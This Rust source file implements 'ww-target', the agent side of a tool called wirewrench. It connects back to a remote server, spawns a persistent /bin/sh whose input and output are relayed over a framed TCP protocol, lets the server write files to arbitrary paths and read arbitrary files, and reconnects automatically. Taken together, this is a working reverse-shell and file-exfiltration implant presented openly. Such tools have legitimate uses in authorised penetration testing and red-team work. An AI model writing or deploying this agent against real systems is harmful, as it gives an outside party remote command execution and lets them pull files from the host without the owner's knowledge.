//! ww-target — smart agent for wirewrench.
//!
//! Connects to ww-server on the smart port (default 4446).
//! Uses a simple framed protocol: [type:u8][len:u32 LE][payload:len bytes].
//!
//! Frame types:
//!   0x01 SHELL      — shell stdin/stdout bytes
//!   0x02 HANDSHAKE  — initial identity exchange
//!   0x03 `FILE_CTRL`  — file transfer coordination (JSON)
//!   0x04 `FILE_DATA`  — raw file bytes (push)
//!   0x05 CANCEL     — abort file transfer
//!   0x06 HASH       — SHA-256 hash verification (JSON)
//!   0x07 KEEPALIVE  — heartbeat

use std::io::{BufRead as _, BufReader, Read, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::thread;
use core::time::Duration;

use anyhow::{Context as _, Result};
use clap::Parser;

use sha2::Digest as _;
use wirewrench::target::protocol::{FRAME_SHELL, FRAME_HANDSHAKE, Handshake, FRAME_FILE_CTRL, FRAME_CANCEL, FRAME_HASH, FRAME_KEEPALIVE, PushReady, FRAME_FILE_DATA, PushError, PushVerified, PullMeta, PushDone};

#[derive(Parser)]
#[command(name = "ww-target")]
struct Args {
    host: String,
    #[arg(short = 'p', long, default_value_t = wirewrench::DEFAULT_SMART_PORT)]
    port: u16,
    #[arg(short = 'P', long = "poll", default_value = "5.0")]
    poll_interval: f64,
    #[arg(short = 'n', long = "no-reconnect")]
    no_reconnect: bool,
}

// ── Frame I/O ───────────────────────────────────────────────────────────────

fn write_frame(w: &mut impl Write, frame_type: u8, payload: &[u8]) -> Result<()> {
    w.write_all(&[frame_type])?;
    w.write_all(&u32::try_from(payload.len())?.to_le_bytes())?;
    if !payload.is_empty() {
        w.write_all(payload)?;
    }
    w.flush()?;
    Ok(())
}

fn read_frame(r: &mut impl Read) -> Result<(u8, Vec<u8>)> {
    let mut header = [0_u8; 5];
    r.read_exact(&mut header)?;
    let frame_type = header[0];
    let len = u32::from_le_bytes(header[1..5].try_into().unwrap()) as usize;
    let mut payload = vec![0_u8; len];
    if len > 0 {
        r.read_exact(&mut payload)?;
    }
    Ok((frame_type, payload))
}

fn write_json_frame(w: &mut impl Write, frame_type: u8, value: &impl serde::Serialize) -> Result<()> {
    let json = serde_json::to_string(value)?;
    write_frame(w, frame_type, json.as_bytes())
}

// ── Pipe forwarder ──────────────────────────────────────────────────────────

/// Spawn a thread that reads lines from `reader` and sends them as `FRAME_SHELL` packets.
fn spawn_pipe_to_frames<R>(reader: R, writer: impl Write + Send + 'static) where R: Read + Send + 'static {
    thread::spawn(move || {
        let mut reader = BufReader::new(reader);
        let mut w = writer;
        let mut buf = Vec::new();
        loop {
            buf.clear();
            match reader.read_until(b'\n', &mut buf) {
                Ok(0) | Err(_) => break,
                Ok(_) => {
                    let _ = write_frame(&mut w, FRAME_SHELL, &buf);
                }
            }
        }
    });
}

// ── Session ─────────────────────────────────────────────────────────────────

fn run_session(stream: &TcpStream) -> Result<()> {
    stream.set_read_timeout(None)?;
    let mut reader = stream.try_clone()?;
    let mut writer = stream.try_clone()?;

    // ── Handshake ────────────────────────────────────────────────
    let hostname = std::env::var("HOSTNAME").ok().or_else(|| std::env::var("COMPUTERNAME").ok());
    let platform = Some(format!("{}/{}", std::env::consts::OS, std::env::consts::ARCH));
    write_json_frame(&mut writer, FRAME_HANDSHAKE, &Handshake::new_client(hostname, platform))?;

    let (ftype, payload) = read_frame(&mut reader)?;
    anyhow::ensure!(ftype == FRAME_HANDSHAKE, "Expected handshake, got frame type {ftype}");
    let resp: Handshake = serde_json::from_slice(&payload)
        .context("Invalid handshake response")?;
    eprintln!("[+] Connected. Session ID: {}", resp.session_id.as_deref().unwrap_or("?"));

    // ── Spawn persistent shell ───────────────────────────────────
    let mut child = Command::new("/bin/sh")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .context("Failed to spawn /bin/sh")?;

    let mut child_stdin = child.stdin.take().unwrap();
    let child_stdout = child.stdout.take().unwrap();
    let child_stderr = child.stderr.take().unwrap();

    // Threads: read shell stdout/stderr → send SHELL frames
    spawn_pipe_to_frames(child_stdout, writer.try_clone()?);
    spawn_pipe_to_frames(child_stderr, writer.try_clone()?);

    // ── Main loop: read frames from server ───────────────────────
    loop {
        let (ftype, payload) = match read_frame(&mut reader) {
            Ok(v) => v,
            Err(e) => {
                eprintln!("[-] Read error: {e}");
                break;
            }
        };

        match ftype {
            FRAME_SHELL => {
                // Write to shell stdin
                if child_stdin.write_all(&payload).is_err() {
                    break;
                }
                if child_stdin.flush().is_err() {
                    break;
                }
            }
            FRAME_FILE_CTRL => {
                let msg: serde_json::Value = match serde_json::from_slice(&payload) {
                    Ok(v) => v,
                    Err(e) => {
                        eprintln!("[-] Invalid FILE_CTRL JSON: {e}");
                        continue;
                    }
                };
                match msg["type"].as_str().unwrap_or("") {
                    "push_start" => {
                        let path = msg["path"].as_str().unwrap_or("").to_owned();
                        let size = msg["size"].as_u64().unwrap_or(0);
                        let expected = msg["hash"].as_str().unwrap_or("").to_owned();
                        if let Err(e) = handle_push(&mut reader, &mut writer, &path, size, &expected) {
                            eprintln!("[-] push error: {e}");
                        }
                    }
                    "pull" => {
                        let path = msg["path"].as_str().unwrap_or("").to_owned();
                        if let Err(e) = handle_pull(&mut writer, &path) {
                            eprintln!("[-] pull error: {e}");
                        }
                    }
                    _ => {}
                }
            }
            FRAME_CANCEL => {
                eprintln!("[!] Received cancel");
                // For now, just continue — the current push/pull handler will
                // fail when it can't read the expected frames
            }
            FRAME_HASH | FRAME_KEEPALIVE => {
                // Ignore (handled inside push/pull handlers for HASH)
            }
            _ => {
                eprintln!("[-] Unknown frame type: {ftype}");
            }
        }
    }

    // Clean up
    let _ = child.kill();
    let _ = child.wait();
    Ok(())
}

// ── Push handler ────────────────────────────────────────────────────────────

fn handle_push(reader: &mut TcpStream, writer: &mut TcpStream, path: &str, size: u64, expected: &str) -> Result<()> {
    // Acknowledge
    write_json_frame(writer, FRAME_HASH, &PushReady::new(path.to_owned()))?;

    // Read FILE_DATA frames until we have all bytes
    let data_cap: usize = size.try_into()?;
    let mut data = Vec::with_capacity(data_cap);
    while data.len() < data_cap {
        let (ftype, payload) = read_frame(reader)?;
        match ftype {
            FRAME_FILE_DATA => {
                data.extend_from_slice(&payload);
            }
            FRAME_CANCEL => {
                let _ = write_json_frame(writer, FRAME_FILE_CTRL,
                    &PushError::new(path.to_owned(), "Cancelled by server".into()));
                return Ok(());
            }
            FRAME_HASH => {
                // push_done — verify and respond
                let msg: serde_json::Value = serde_json::from_slice(&payload)?;
                if msg["type"] == "push_done" {
                    break;
                }
            }
            _ => {
                eprintln!("[-] Unexpected frame type {ftype} during push");
            }
        }
    }

    // Verify hash
    let mut h = sha2::Sha256::new();
    h.update(&data);
    let actual = format!("{:x}", h.finalize());

    if actual != expected {
        let _ = write_json_frame(writer, FRAME_FILE_CTRL,
            &PushError::new(path.to_owned(), format!("Hash mismatch: expected {expected}, got {actual}")));
        return Ok(());
    }

    // Write to disk
    if let Some(p) = std::path::Path::new(path).parent() {
        let _ = std::fs::create_dir_all(p);
    }
    if let Err(e) = std::fs::write(path, &data) {
        let _ = write_json_frame(writer, FRAME_FILE_CTRL,
            &PushError::new(path.to_owned(), format!("Write error: {e}")));
        return Ok(());
    }

    write_json_frame(writer, FRAME_HASH, &PushVerified::new(actual))?;
    eprintln!("[+] Received '{path}' ({expected})");
    Ok(())
}

// ── Pull handler ────────────────────────────────────────────────────────────

fn handle_pull(writer: &mut TcpStream, path: &str) -> Result<()> {
    let data = match std::fs::read(path) {
        Ok(d) => d,
        Err(e) => {
            let _ = write_json_frame(writer, FRAME_FILE_CTRL,
                &PushError::new(path.to_owned(), format!("Read error: {e}")));
            return Ok(());
        }
    };

    let size = data.len() as u64;
    let mut h = sha2::Sha256::new();
    h.update(&data);
    let hash = format!("{:x}", h.finalize());

    // Send metadata
    write_json_frame(writer, FRAME_FILE_CTRL, &PullMeta::new(path.to_owned(), size, hash.clone()))?;

    // Send file data in chunks
    for chunk in data.chunks(8192) {
        write_frame(writer, FRAME_FILE_DATA, chunk)?;
    }

    // Send done
    write_json_frame(writer, FRAME_HASH, &PushDone::new(hash))?;
    eprintln!("[+] Sent '{path}' ({size} bytes)");
    Ok(())
}

// ── Main ────────────────────────────────────────────────────────────────────

fn main() -> Result<()> {
    let args = Args::parse();
    let addr = format!("{}:{}", args.host, args.port);
    loop {
        eprintln!("[+] Connecting to {addr} ...");
        match TcpStream::connect(&addr) {
            Ok(stream) => {
                if let Err(e) = run_session(&stream) {
                    eprintln!("[-] Session error: {e}");
                }
            }
            Err(e) => {
                eprintln!("[-] Connection failed: {e}");
            }
        }
        if args.no_reconnect {
            break;
        }
        thread::sleep(Duration::from_secs_f64(args.poll_interval.max(1.0)));
    }
    Ok(())
}
